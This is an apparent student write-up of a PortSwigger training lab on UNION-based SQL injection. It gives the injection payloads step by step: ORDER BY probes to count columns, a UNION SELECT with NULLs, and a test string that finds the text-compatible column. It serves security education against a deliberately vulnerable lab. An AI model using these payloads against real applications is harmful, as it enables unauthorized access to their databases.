[Lab: SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)  


## Steps to Solve

1. **Launch the Lab:** Open the PortSwigger lab and navigate to the shop interface.

2. **Intercept the Request:** Click on any product category and intercept the category filter request using Burp Suite.

3. **Determine the Number of Columns:** Use `ORDER BY` to identify the column count.

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
```

- `ORDER BY 1, 2, 3` – Success
- `ORDER BY 4` – Error

**Result:** The query returns three columns.

4. **Verify the Column Count:** Use three `NULL` values in a UNION query.

```sql
' UNION SELECT NULL,NULL,NULL--
```

**Result:** The query executes successfully.

5. **Identify the Text-Compatible Column:** Replace each `NULL` with the random string provided by the lab (`LpWWGs`), testing one column at a time.

```sql
' UNION SELECT 'LpWWGs',NULL,NULL--
```
**Result:** Error.

```sql
' UNION SELECT NULL,'LpWWGs',NULL--
```
**Result:** Success — the second column accepts text.

6. **Verify Lab Completion:** The database retrieves the required string `LpWWGs`, and the lab is automatically solved.

## Key Takeaways

- **ORDER BY:** Determines the number of columns.
- **UNION SELECT:** Combines results from multiple queries.
- **NULL:** Helps test column compatibility.
- **Text-Compatible Column:** Identifies which column can display string data.

## Lab Information

- **Vulnerability:** SQL Injection (SQLi)
- **Attack Type:** UNION-Based SQL Injection
- **Tool:** Burp Suite Community Edition
